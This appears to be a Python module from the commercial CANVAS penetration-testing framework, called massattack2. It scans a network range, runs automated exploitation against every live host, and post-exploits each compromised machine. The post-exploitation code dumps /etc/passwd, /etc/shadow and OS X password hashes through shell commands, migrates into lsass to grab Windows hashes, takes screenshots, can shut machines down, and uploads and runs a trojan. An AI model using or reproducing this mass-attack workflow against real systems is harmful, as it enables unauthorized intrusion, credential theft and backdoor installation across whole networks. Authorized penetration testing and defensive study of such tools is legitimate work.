#! /usr/bin/env python
"""
massattack2.py
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation


NAME="massattack2"

VERSION="2.0"
NOTES2="""

"""

CHANGELOG="""
1.0 
Created.
"""

DEBUGNOTES="""
    
"""

import os
import sys
if "." not in sys.path: sys.path.append(".")

import timeoutsocket
        
import socket
from exploitutils import *

from tcpexploit import tcpexploit
import canvasengine
import time

from hostKnowledge import *
from engine.config import canvas_resources_directory
from engine import CanvasConfig


DOCUMENTATION={}
DOCUMENTATION["Notes"]="""
For a given network range do the following actions:
1. Find all the alive hosts
2. For each alive host run Autohack
3. If autohack reports success run a postscript on the node and exit cleanly
4. If we get a newnode and you've placed massattack_win32trojan.exe in the CANVAS root, it will be uploaded and run.

TODO:
Future releases want to fingerprint each host so that if a host changes IP, we still
know where it is.
"""

DESCRIPTION="Multi-threaded attack tool (With improved threading)"

VERSION="0.1"

PROPERTY = {}
PROPERTY['TYPE'] = "Tools"

NOTES=""" 

"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.vulns=[]
        self.setPort(0)
        self.setHost("")
        self.setVersion(1)
        self.istest=0
        self.setVersions()
        self.shellcode="A"
        self.localhost=""
        self.localport=0
        self.ssl=0
        self.doshell=1
        self.force=0
        self.name=NAME
        self.netmask="32"
        self.portscan=1 #default is do a portscan
        self.followup=None #module to run on all successful targets (like startup)
        #self.onlymodule=None
        self.exploit_modules=None #If none autohack runs all the modules it can, else supply a list

        self.autohack_module_table={}
        
        self.ignore_unid_hosts=1
        self.silica_flag=False
        self.ssid=self.tpref=""
        self.localips=[]
        self.sshot=False
        #specific options from canvas.conf
        self.options={"trojan_win32Node": "bob.exe", "doscreengrab": False, "dogethashes": True, "Halt": False}
        return   

     
    def getargs(self):
        self.host=self.target.interface
        self.netmask=dInt(str(self.argsDict.get("netmask",self.netmask)).replace("/",""))
        self.portscan=int(self.argsDict.get("portscan",self.portscan))
        self.maxthreads=int(self.argsDict.get("maxthreads",self.maxthreads))
        self.exploit_modules=self.argsDict.get("exploit_modules",self.exploit_modules)
        self.ignore_unid_hosts=self.argsDict.get("ignore_unid_hosts",self.ignore_unid_hosts)
        self.ssid=self.argsDict.get("ssid",self.ssid)
        self.silica_flag=self.argsDict.get("silica_flag",self.silica_flag)

        # Normal CANVAS
        self.options["doscreengrab"]=CanvasConfig['massattack_doscreengrab']
        self.options["dogethashes"]=CanvasConfig['massattack_dogethashes']

        return
        

    def process_thread_results(self, status_q, end_of_run_marker):
        """
        This is the ThreadRunner2 magic right here. Essentially ALL threads return state about
        what they are up to via a q to the ThreadTracker, The ThreadTracker then does some
        sanitization and spits stuff back down a results q to us.
        
        This means that we can sit in a loop and read from the same q for all the targets in
        our range and do stuff like reporting based on what we see coming back.
        
        Data comes back in the form of:
             [Thread Object to which this status relate] , [status marker] ,[data]
        
        *REMEBER* this is one queue for ALL threads, not one for each!
        """
        while 1:
            tr2_obj, status, data=status_q.get()
            
            if status == end_of_run_marker:
                ##ALL threads have completed so now more status/results to process
                tr2_obj.join()
                break
            
            # elif status == "newhost":
            #     self.report.newhost(data) #data == target
                
            # elif status == "note":
            #     self.report.note(data[0], data[1]) #data[0]==target, data[1]==explanation str
                
            # elif status == "extras":
            #     self.report.add_extras(data) #data == str
                
            # elif status == "failure":
            #     self.report.report_failure(data) #data == target
                
            # elif status == "killed":
            #     self.report.report_failure(data[0]) #data == target
            #     self.report.note(data[0], data[1]) #data[0]==target, data[1]==explanation str
                
            # elif status=="error":
            #     self.report.note(data[0], data[1]) #data[0]==target, data[1]==explanation str
                
            elif status == "exception":
                print data
                
            elif status == "success":
                ##And now we take actions based on the return of the sucessful exploit
                self.process_exploit_success(data) #data==results triplet from exploit module
        
        self.log("All results gathered")
        
    def process_exploit_success(self, result):
        """
        If an exploit succeeds we can do many different things, do the right ones
        based on what we get back!!
        """
        for target,usedvuln,newnode in result:
            self.log("We succeeded in penetrating %s"%self.target.interface)
            #newnode MAY be None in certain error cases
            #in that case, we simply continue

            if newnode!=None:
                type1=newnode.nodetype
                self.log("Nodetype on %s is %s"%(self.target.interface, type1))
                # This is unix type do something useful
                if type1=="UnixShellNode":
                    #TODO: here we are assuming OS X I think! We need to make this generica
                    cdata=newnode.runcommand("/usr/bin/nidump passwd . && cat /var/db/shadow/hash/*")
                elif "Solaris" in newnode.capabilities:
                    self.log("Owned Solaris target")
                    cdata=newnode.runcommand("cat /etc/passwd && cat /etc/shadow && ls -lart /tmp/ && last")
                elif "linux" in newnode.capabilities:
                    self.log("Owned Linux target")
                    cdata = newnode.runcommand("id && uname -a && cat /etc/passwd && cat /etc/shadow")
                # Win32 so we try hashes or screengrab
                elif "win32api" in newnode.capabilities:
                    if self.options["dogethashes"]:
                        self.log("Migrating into lsass")
                        ret=self.exploitnodes("mosdefmigrate",[newnode])
                        self.log("Grabbing password hashes")
                        ret=self.exploitnodes("getpasswordhashes",[newnode])[0]

                    if self.options["doscreengrab"]:
                        self.log("Grabbing screenshot")
                        ret=self.exploitnodes("screengrab",[newnode])

                            
                    if self.options["Halt"]:        
                        self.exploitnodes("ExitWindows",[newnode])
                    
                    
                    self.log("looking for trojan for %s"%newnode.nodetype)
                    bdname=self.options.get("trojan_%s"%newnode.nodetype)
                    self.log("Trojan name: %s"%bdname)
                    bdfile=None

                    if bdname:
                        try:
                            bdfile=file(bdname, "rb")
                        except:
                            self.log("No backdoor file found for uploading")
                    if bdfile:
                        #we have a trojan
                        self.log("Uploading and executing trojan")
                        #uploading is the same for all nodes
                        newnode.upload(bdname)
                        #unix nodes need a ./
                        if not "win32api" in newnode.capabilities:
                            bdname="./%s"%bdname
                        newnode.spawn(bdname)
                            

                    if self.followup:
                        self.exploitnodes(self.followup,[newnode])
                        self.log("Ran followup on %s"%self.target.interface)
                    else:
                        self.log("Followup on %s not requested"%self.target.interface)
            else:
                self.log("Did not get a node for host %s"%self.target.interface)
    
    def run(self):
        self.getargs()
        
        self.localips=[]
        for node in self.argsDict.get("passednodes",[]):
            self.localips+=node.getallips()
            
        self.setInfo("Massattack2 Attacking: %s"%(self.host))
        self.log("Interface=%s"%self.host)
        self.log("Netmask=%s"%self.netmask)
        self.log("MaxThreads=%d"%self.maxthreads)

        self.vulns=[] #clear it
        #print ips

        if not canvasengine.registeredallmodules:
            canvasengine.registerAllModules()
            
        #time our scan run
        now=time.localtime(time.time())
        # %y is broken it reports something like '22'
        strtime=time.strftime("%Y/%m/%d %H:%M", now)
        self.log("Start time: %s"%strtime)
        tc0=time.time()
        self.node=self.argsDict["passednodes"][0]
            
        self.setInfo("[MassAttack2] Scanning network: %s/%s"%(self.host, self.netmask))
        self.setProgress(5)

        if not "threads" in self.node.capabilities:
            self.log("Warning: not using threads because selected node does not support threading, maxthreads reset to 1.")
            ##We are running on a MOSDEFNode so we can't do stuffs in parallel, set number of threads to 1
            self.maxthreads=1
        
        ##Do the scans
        self.run_threaded_on_alive_hosts(e_module="autohack")

        #end of our timing ...
        now=time.localtime(time.time())
        # same as above
        strtime=time.strftime("%Y/%m/%d %H:%M", now)
        self.log("Stop time: %s"%strtime)

        tc1=time.time()
        self.log("Seconds used: %s"%(tc1-tc0))

        # if self.silica_flag:
        #     filename="MA_Report_%s_%s_%s.html"%(self.ssid,self.host,tc1)
        # else:
        #     filename="Mass_Attack2_report_%s_%s_%.0f.html"%(self.host,self.netmask,(time.time()))
        
        # if self.silica_flag:
        #     sr = reporting.SilicaReport('massattack2', self.ssid)
        #     data = sr.create_silica_report()
        # else:
        #     data=self.report.generate_massattack_html()
            
        self.setInfo("Massattack2 scanned %s (done)"%(self.host))
                    
        return 1
        
        
    def setVersions(self):
        self.versions={}
        self.versions[1]=("All", None)
        
        
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])
            
        
def usage():
    app = theexploit()
    print "Usage: "+sys.argv[0]+" [-T] [-v version]  -t target [ -p targetport:%d]"%(app.port)
    app.displayVersions()

#this stuff happens.
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

